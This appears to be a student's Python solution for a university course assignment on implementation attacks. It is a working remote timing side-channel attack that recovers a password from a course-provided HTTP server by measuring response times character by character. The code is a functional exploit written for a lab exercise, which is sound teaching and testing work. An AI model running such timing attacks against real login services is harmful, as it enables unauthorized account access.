"""
    Assignment 1.2 on Attacks On Implementations [CS - 3682] @ Runi
    Timing-based password attack implementation using HTTP response timing differences.    
"""

from abc import ABC, abstractmethod
from dataclasses import dataclass
import statistics
from typing import Dict, Any, List, Tuple

import asyncio
import aiohttp

import string
import time

# ==========================
# Logging
# ==========================
class Logger:
    def __init__(self, enabled: bool = True):
        self.enabled = enabled

    def log(self, msg: str = ""):
        if self.enabled:
            print(msg)


logger = Logger(enabled=False)


# ==========================
# Victim Server Configuration
# ==========================
@dataclass
class VictimServer:
    """Configuration container for the target server."""
    def __init__(
        self,
        url: str = "http://127.0.0.1/",
        alphabet: List[str] = list(string.ascii_lowercase),
        max_pwd_len: int = 32
    ):
        """Initialize victim server details.

        Args:
            url: Base URL of the server.
            alphabet: Characters to try during brute-force.
            max_pwd_len: Maximum expected password length.
        """
        self.url = url
        self.alphabet = alphabet
        self.max_pwd_len = max_pwd_len


# ==========================
# Decision Engine
# ==========================
class DecisionEngine(ABC):
    """Abstract base class for timing-based decision logic."""
    @abstractmethod
    def decide(self, candidates: Dict[str, List[int]]) -> str: ...
    """Choose the most likely character from timing samples."""
    @abstractmethod
    def decide_top_k(self, candidates: Dict[str, List[int]], top_k: int) -> List[Tuple[str, float]]: ...
    """Return top-k candidates ranked by timing difference."""


# ==========================
# Request Sender
# ==========================
class RequestSender(ABC):
    """Abstract interface for sending requests to the victim server."""
    @abstractmethod
    async def send(self, payload: Dict[str, Any]) -> Tuple[str, int]: ...
    @abstractmethod
    async def close_sessions(self) -> None: ...


class AsyncHTTPSender(RequestSender):
    """HTTP-based request sender with connection pooling and warmup."""
    def __init__(
        self,
        url: str,
        base_payload: Dict[str, Any],
        timeout_sec: float = 5.0,
        pool_size: int = 100 # שוּנה: הגדלת בריכת החיבורים ל-100
    ):
        self.url = url.rstrip("/") + "/"
        self.fixed_payload = base_payload.copy()
        self.pool_size = pool_size
        self.session = None
        self.timeout_sec = timeout_sec

    async def _setup_session(self) -> None:
        """Create and configure a requests Session with connection pooling."""
        timeout = aiohttp.ClientTimeout(total=self.timeout_sec)
        # שימוש ב-TCPConnector עם מגבלת חיבורים גבוהה
        connector = aiohttp.TCPConnector(limit=self.pool_size, ssl=False) 
        self.session = aiohttp.ClientSession(timeout=timeout, connector=connector)


    async def _do_initial_warmup(self) -> None:
        """Perform a few dummy requests to warm up connection pool"""
        # הרצת Warmup במקביל
        tasks = []
        for i in range(3):
            payload = {"password": f"warm{i}"}
            tasks.append(self.session.get(self.url, params=payload))
        
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except:
            pass
            

    async def init(self):
        await self._setup_session()
        await self._do_initial_warmup()


    async def send(self, payload: Dict[str, Any]) -> Tuple[str, int]:
        """Send a single request with combined fixed + variable payload.

        Args:
            payload: Dynamic part of the query parameters.

        Returns:
            Tuple containing stripped response text and elapsed time in microseconds.
            On error returns ("", 0).
        """
        request = self.fixed_payload.copy()
        request.update(payload)

        try:
            start_ns = time.perf_counter_ns()
            
            async with self.session.get(url=self.url, params=request) as response:
                body_txt = (await response.text()).strip()
            elapsed_us = (time.perf_counter_ns() - start_ns) // 1000

            return body_txt, int(elapsed_us)
            
        except Exception:
            # במקרה של שגיאה (Timeout או אחרת), מחזיר 0 שמהווה outlier ויוסר בדרך כלל
            return "", 0

    async def close_sessions(self):
        if self.session:
            await self.session.close()
            self.session = None

# ==========================
# Sampler
# ==========================
class AsyncSampler:
    """Utility to collect multiple timing samples for a given payload."""
    def __init__(self, sender: RequestSender):
        """Initialize sampler with a request sender.
        Args:    
            sender: Object responsible for sending HTTP requests.
        """
        self.sender = sender

    async def run_sample(self, payload: Dict[str, Any], n_samples: int = 1) -> Tuple[str, List[int]]:
        """Run multiple requests and collect timing data concurrently.
        """
        if isinstance(self.sender, AsyncHTTPSender) and self.sender.session is None:
            await self.sender.init()

        # הדגימות רצות במקביל! (כבר היה בקוד המקורי - נשמר)
        tasks = [self.sender.send(payload) for _ in range(n_samples)]
        results = await asyncio.gather(*tasks, return_exceptions=False)

        bodies = [body for body, _ in results]
        times = [elapsed_time for _, elapsed_time in results if elapsed_time > 0]
        
        return bodies[-1], times


class MedianDecisionEngine(DecisionEngine):
    """Decision engine using median timing and MAD-based outlier removal."""
    def __init__(self, min_samples: int = 2):
        """Initialize engine.

        Args:
            min_samples: Minimum number of valid samples required per character.
        """
        self.min_samples = min_samples

    def decide(self, candidates: Dict[str, List[int]]) -> str:
        """Return the single best candidate.

        Args:
            candidates: Mapping of character -> list of timing samples.

        Returns:
            Best character or empty string if no decision possible.
        """
        top = self.decide_top_k(candidates, top_k=1)
        return top[0][0] if top else ""

    def decide_top_k(self, candidates: Dict[str, List[int]], top_k: int = 3) -> List[Tuple[str, float]]:
        """Return top-k characters ranked by median timing (higher = slower = likely correct).

        Uses Median Absolute Deviation (MAD) for outlier removal when enough samples exist.

        Args:
            candidates: Mapping of character -> list of timing samples.
            top_k: Number of top candidates to return.

        Returns:
            List of (character, time_delta) tuples sorted descending by delta.
        """
        if not candidates:
            return []

        cleaned = {}
        for char, times in candidates.items():
            if len(times) < self.min_samples:
                continue

            med = statistics.median(times)

            # Remove outliers in case we have enough samples
            if len(times) > 3:
                mad = statistics.median([abs(t - med) for t in times])
                if mad > 0:
                    times = [t for t in times if abs(t - med) <= 3 * mad]
            cleaned[char] = statistics.median(times) if times else med

        if not cleaned:
            return []

        min_time = min(cleaned.values())
        scores = [(c, t - min_time) for c, t in cleaned.items()]
        scores.sort(key=lambda x: x[1], reverse=True)
        return scores[:top_k]
    

# ==========================
# TimingAttacker - main logic
# ==========================
class TimingAttacker:
    """Orchestrates the full timing attack."""
    def __init__(
        self,
        victim_server: VictimServer,
        sender: AsyncSampler,
        base_payload: Dict[str, Any],
        decision_engine: DecisionEngine,
        padding: str = "@"
    ):
        """Initialize the attacker.

        Args:
            victim_server: Configuration of the target.
            sender: HTTP request sender instance.
            base_payload: Fixed query parameters (user, difficulty, etc.).
            decision_engine: Engine to interpret timing data.
            padding: Character used to pad incorrect password attempts.
        """
        self.victim = victim_server
        self.sender = sender
        self.sampler = AsyncSampler(sender)
        self.base_payload = base_payload
        self.decision_engine = decision_engine
        self.padding = padding

    async def detect_password_length(self, samples_for_pwd_len: int = 5) -> int:
        """Detect password length by observing timing differences for padded passwords.

        Returns:
            Detected password length (as integer string from server logic).
        """
        samples_for_len: Dict[int, List[int]] = {}
        
        for length in range(1, self.victim.max_pwd_len + 1):
            payload = {"password": self.padding * length}
            _, samples = await self.sampler.run_sample(payload, n_samples=samples_for_pwd_len)
            samples_for_len[length] = samples

        best_len = self.decision_engine.decide(samples_for_len)
        return best_len

    async def _measure_candidates(
        self,
        candidates: List[str],
        prefix: str,
        suffix: str,
        new_samples_per_candidate: int
    ) -> Dict[str, List[int]]:
        """Measure timing for each candidate character at current position.

        Args:
            candidates: List of characters to test.
            prefix: Already recovered password prefix.
            suffix: Padding or known suffix.
            samples_per_candidate: How many samples per character.

        Returns:
            Mapping of character -> list of timing samples.
        """
        
        async def get_samples_for_char(char: str) -> Tuple[str, List[int]]:
            payload = {"password": prefix + char + suffix}
            _, samples = await self.sampler.run_sample(payload, n_samples=new_samples_per_candidate)
            return char, samples
        
        tasks = [get_samples_for_char(char) for char in candidates]
        results = await asyncio.gather(*tasks, return_exceptions=False)

        measures: Dict[str, List[int]] = {}
        for char, samples in results:
            measures[char] = samples

        return measures

    def _calc_gap(self, samples: Dict[str, List[int]]) -> Tuple[float, str]:
        """Calculate the timing gap between best and second-best candidate.

        Returns:
            Tuple of (gap_in_us, best_character).
        """
        medians = {c: statistics.median(arr) for c, arr in samples.items() if arr}

        if not medians:
            return 0, "a"
        
        sorted_med = sorted(medians.items(), key=lambda x: x[1], reverse=True)
        best_char, best_time = sorted_med[0]
        second_time = sorted_med[1][1] if len(sorted_med) > 1 else best_time
        return best_time - second_time, best_char

    async def _attack_position(
        self,
        prefix: str,
        suffix: str,
        top_k: int,
        max_rounds: int,
        sample_increment: int,
        max_samples: int,
        initial_samples: int,
        min_gap_us: int
    ) -> str:
        """Attack a single non-final position using adaptive sampling.

        Returns:
            The recovered character
        """
        candidates = list(self.victim.alphabet)
        samples_per_candidate = initial_samples
        round_number = 0

        candidates_samples: Dict[str, List[int]] = {}

        while len(candidates) > 1 and round_number < max_rounds:
            round_number += 1
            
            logger.log(f"       round num {round_number} | candidates: {candidates} | samples_p_candidates: {samples_per_candidate}")
            
            candidates_samples = await self._measure_candidates(
                candidates, prefix, suffix, samples_per_candidate
            )
            gap, best_char = self._calc_gap(candidates_samples)

            logger.log(f"       best_char '{best_char}' | gap {gap}")

            if gap >= min_gap_us:
                return best_char

            # Reduce candidate set to top-k and increse sampling
            best_k = self.decision_engine.decide_top_k(candidates_samples, top_k=top_k)
            candidates = [c for c, _ in best_k]
            samples_per_candidate = min(samples_per_candidate + sample_increment, max_samples)

        return self.decision_engine.decide(candidates_samples)


    async def _attack_last_position(self, prefix: str) -> str:
        """Brute-force the final character by checking for success response.

        Args:
            prefix: Recovered password so far (missing last char).

        Returns:
            Complete password.
        """
        async def get_resbody_for_char(char: str) -> Tuple[str, str]:
            payload = {"password": prefix + char}
            body_txt, _ = await self.sampler.run_sample(payload, n_samples=1)
            return char, body_txt
        
        tasks = [get_resbody_for_char(char) for char in self.victim.alphabet]
        results = await asyncio.gather(*tasks, return_exceptions=False)

        for char, body_txt in results:
            if body_txt == "1":
                return prefix + char

        return prefix
    

    async def attack(
        self,
        password_len: int,
        top_k: int = 5,
        max_rounds: int = 3,
        sample_increment: int = 1,
        max_samples: int = 10,
        initial_samples: int = 3,
        min_gap_microseconds: int = 200
    ) -> str:
        """Perform the complete timing attack.

        Args:
            password_len: Length of the password (as detected or known).
            top_k: Number of candidates to keep between rounds.
            max_rounds: Maximum refinement rounds per position.
            sample_increment: How many more samples to take each failed round.
            max_samples: Upper bound on samples per candidate.
            initial_samples: Starting number of samples per candidate.
            min_gap_microseconds: Minimum timing gap to trust a decision.

        Returns:
            Recovered password as string.
        """
        password = ""
        for pos in range(password_len):
            if pos == password_len - 1:
                password = await self._attack_last_position(prefix=password)
                break
            
            suffix = self.padding * (password_len - len(password) - 1)
            logger.log(f"    Attack position {pos} | prefix: {password} suffix: {suffix}")

            next_char = await self._attack_position(
                prefix=password,
                suffix=suffix,
                top_k=top_k,
                max_rounds=max_rounds,
                sample_increment=sample_increment,
                max_samples=max_samples,
                initial_samples=initial_samples,
                min_gap_us=min_gap_microseconds
            )
            password += next_char

        return password
    

# ==========================
# Main
# ==========================
def calibrate_attack_params(difficulty: int = 1) -> Dict[str: int]:
    attack_params = {
        "initial_samples": max(2, difficulty) if difficulty <= 5 else difficulty * 2,
        "sample_increment": 2 if difficulty <= 4 else difficulty,
        "max_samples": max(10, difficulty * 5),
        "min_gap_us": max(1000, 100000 // difficulty),
        "top_k": 3 if difficulty <= 3 else 5,
        "max_rounds": 3 if difficulty <= 2 else 5
    }
    return attack_params

async def commit_full_attack(username: str, victim: VictimServer, difficulty: int = 1, retries_on_fail: int = 3):
    base_payload = {"user": username, "difficulty": difficulty}
    
    async_http_sender = AsyncHTTPSender(url=victim.url, base_payload=base_payload)
    median_decision_engine = MedianDecisionEngine(min_samples=max(2, difficulty))
    attacker = TimingAttacker(
        victim_server=victim,
        sender=async_http_sender,
        base_payload=base_payload,
        decision_engine=median_decision_engine
    )
    attack_params = calibrate_attack_params(difficulty=difficulty)

    try:
        password_length = await attacker.detect_password_length()
        password = await attacker.attack(password_len=password_length, **attack_params)
        # TODO: check if succuss (1), if not do retrie
        await async_http_sender.close_sessions()
    
    except Exception as e:
        await async_http_sender.close_sessions()




async def main():
    BASE_URL = "http://aoi-assignment1.oy.ne.ro:8080/"
    USERNAME = "315388850"
    MAX_DIFFICULTY = 5

    victim = VictimServer(url=BASE_URL)






if __name__ == "__main__":
    asyncio.run(main())